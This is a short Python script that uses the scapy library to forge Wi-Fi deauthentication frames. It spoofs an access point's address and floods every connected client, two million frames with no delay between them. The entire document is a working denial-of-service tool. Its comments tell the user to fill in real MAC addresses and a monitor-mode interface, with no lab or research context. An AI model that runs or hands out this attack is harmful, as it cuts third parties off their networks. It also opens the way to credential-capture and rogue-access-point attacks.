from scapy.all import *

def deauth(target_mac, gateway_mac, iface, count=100000):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=count, inter=0)
    print(f"Sent {count} deauth packets to {target_mac} from {gateway_mac} on {iface}")

if __name__ == "__main__":
    # Replace these with actual MAC addresses
    target_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast to all clients
    gateway_mac = "AA:BB:CC:DD:EE:FF"  # Target AP BSSID
    iface = "en0"  # Your Wi-Fi interface in monitor mode

    deauth(target_mac, gateway_mac, iface, count=2000000)